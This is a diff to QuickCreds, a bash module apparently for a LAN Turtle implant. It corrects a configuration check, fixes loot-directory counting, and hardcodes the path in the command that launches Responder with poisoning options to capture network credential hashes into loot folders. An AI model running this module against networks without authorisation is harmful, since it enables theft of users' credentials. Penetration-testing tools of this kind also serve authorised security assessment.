@@ -40,7 +40,7 @@ function configure {
 
     # Check to see if QuickCreds has already been configured
     # Check if Responder is installed (not the module available in the Turtle "GUI", but the tool taken straight from GitHub)
-    if [[ ! -d "$RESPROOT"/Responder || ! -s "$RESPROOT"/Responder/Responder.py ]]; then
+    if [[ -d "$RESPROOT"/Responder && -s "$RESPROOT"/Responder/Responder.py ]]; then
         /usr/bin/dialog --title "QuickCreds" --msgbox "\nThe QuickCreds module is already configured.\nCreds are saved to $LOOTDIR.\nEnable this module to attack on boot." 9 72
         exit 1
     fi
@@ -125,7 +125,7 @@ function start {
     # Create new numbered loot directory and symlink it from Responder logs
     /bin/mkdir -p $LOOTDIR
     cd $LOOTDIR
-    dircount=$(/bin/ls -lad $LOOTDIR* | /usr/bin/wc -l)
+    dircount=$(/bin/ls -lad $LOOTDIR/* | /usr/bin/wc -l)
     # Adjust the number when creating the numbered lootdir for this session, if no existing dirs (i.e. wc -l = 0) then start with 1 instead of 0 otherwise there will be a gap between 0 and 2
     if [[ $((dircount)) == 0 ]]; then dircount=1; fi
     /bin/mkdir $LOOTDIR"/Creds"$((dircount))
@@ -144,7 +144,7 @@ function start {
 
     # Execute attack
     /bin/echo "Creds$((dircount)) - Starting screen and Responder" >>$RESPLOG
-    /usr/sbin/screen -dmS responder /bin/bash -c 'cd "$RESPROOT"/Responder; /usr/bin/python "$RESPROOT"/Responder/Responder.py -I eth0 -w -r -d -P'
+    /usr/sbin/screen -dmS responder /bin/bash -c 'cd /etc/turtle/Responder; /usr/bin/python /etc/turtle/Responder/Responder.py -I eth0 -w -r -d -P'
 
     /bin/echo "Creds$((dircount)) - LED blink pattern during attack enabled" >>$RESPLOG
     # Blink upon hash capture
